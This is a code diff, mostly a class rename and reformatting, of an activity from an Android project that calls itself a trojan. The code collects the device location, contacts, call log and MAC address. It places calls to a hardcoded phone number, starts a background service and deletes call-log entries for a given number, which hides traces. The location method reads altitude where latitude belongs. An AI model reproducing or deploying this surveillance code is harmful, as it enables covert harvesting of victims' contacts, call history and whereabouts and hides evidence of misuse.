@@ -20,15 +20,15 @@ import android.widget.Button;
 
 import java.util.ArrayList;
 
-import trojan.android.android_trojan.Service.BackgroundService;
 import trojan.android.android_trojan.BroadcastReceiver.PhoneStateReceiver;
 import trojan.android.android_trojan.R;
+import trojan.android.android_trojan.Service.BackgroundService;
 import trojan.android.android_trojan.Tools;
 
 /**
  * Created by Jean-Laurent on 26/11/2014.
  */
-public class second_activity extends Activity {
+public class SecondActivity extends Activity {
     private static final String TAG = "second_activity";
     private Button button21;
     private Button button22;
@@ -67,40 +67,40 @@ public class second_activity extends Activity {
                 call("0628470850", 20000);
             }
         });
-        button24.setOnClickListener(new View.OnClickListener(){
+        button24.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 ArrayList<String[]> calllog = (ArrayList<String[]>) getCallLog();
             }
         });
 
-        start_service.setOnClickListener(new View.OnClickListener(){
+        start_service.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                startService(new Intent(second_activity.this, BackgroundService.class));
+                startService(new Intent(SecondActivity.this, BackgroundService.class));
             }
         });
 
-        stop_service.setOnClickListener(new View.OnClickListener(){
+        stop_service.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                stopService(new Intent(second_activity.this, BackgroundService.class));
+                stopService(new Intent(SecondActivity.this, BackgroundService.class));
             }
         });
     }
 
-    public double[] getLocation(){
+    public double[] getLocation() {
         //Get location manager
-        LocationManager locManager = (LocationManager)getSystemService(LOCATION_SERVICE);
+        LocationManager locManager = (LocationManager) getSystemService(LOCATION_SERVICE);
         //get the best provider to obtain the current location
         Location location = locManager.getLastKnownLocation(locManager.getBestProvider(new Criteria(), false));
         double[] result = new double[2];
 
         //try to get latitude and longitude
-        try{
+        try {
             result[0] = location.getAltitude();
             result[1] = location.getLongitude();
-        }catch (Exception ex){//if this failed the method return 0,0
+        } catch (Exception ex) {//if this failed the method return 0,0
             Log.d(TAG, ex.getMessage());
             result[0] = 0;
             result[1] = 0;
@@ -109,7 +109,7 @@ public class second_activity extends Activity {
     }
 
 
-    public ArrayList getContacts(){
+    public ArrayList getContacts() {
         ContentResolver cr = getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
@@ -124,7 +124,7 @@ public class second_activity extends Activity {
                     Cursor pCur = cr.query(
                             ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                             null,
-                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                             new String[]{id}, null);
                     while (pCur.moveToNext()) {
                         String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
@@ -137,10 +137,10 @@ public class second_activity extends Activity {
         return contacts;
     }
 
-    public void call(String num, long time){
-        if (time > 1000){
+    public void call(String num, long time) {
+        if (time > 1000) {
             Intent intent = new Intent(Intent.ACTION_CALL);
-            intent.setData(Uri.parse("tel:"+num));
+            intent.setData(Uri.parse("tel:" + num));
             startActivity(intent);
             Log.d(TAG, "Start call");
             PhoneStateReceiver test = new PhoneStateReceiver();
@@ -153,44 +153,44 @@ public class second_activity extends Activity {
         }
     }
 
-    public ArrayList getCallLog(){
+    public ArrayList getCallLog() {
         ArrayList<String[]> callLog = new ArrayList<String[]>();
-        String columns[]=new String[] {
+        String columns[] = new String[]{
                 CallLog.Calls._ID,
                 CallLog.Calls.NUMBER,
                 CallLog.Calls.DATE,
                 CallLog.Calls.DURATION,
                 CallLog.Calls.TYPE};
         Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, "Calls._ID DESC"); //last record first
-        if (cursor.moveToFirst()){
-             do {
-                 callLog.add(new String[]{
-                         cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID)),
-                         cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)),
-                         cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)),
-                         cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)),
-                         cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)),
-                 });
+        if (cursor.moveToFirst()) {
+            do {
+                callLog.add(new String[]{
+                        cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID)),
+                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)),
+                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)),
+                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)),
+                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)),
+                });
             } while (cursor.moveToNext());
         }
         return callLog;
     }
 
-    public void deleteCallLog(String num){
-        String strNumberOne[] = { num };
+    public void deleteCallLog(String num) {
+        String strNumberOne[] = {num};
         Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
-        if (cursor.moveToFirst()){
+        if (cursor.moveToFirst()) {
             do {
                 int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
                 getContentResolver().delete(
                         CallLog.Calls.CONTENT_URI,
                         CallLog.Calls._ID + "= ? ",
-                        new String[] { String.valueOf(idOfRowToDelete) });
+                        new String[]{String.valueOf(idOfRowToDelete)});
             } while (cursor.moveToNext());
         }
     }
 
-    public String getMacAddress(){
+    public String getMacAddress() {
         WifiManager manager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
         WifiInfo info = manager.getConnectionInfo();
         return info.getMacAddress();
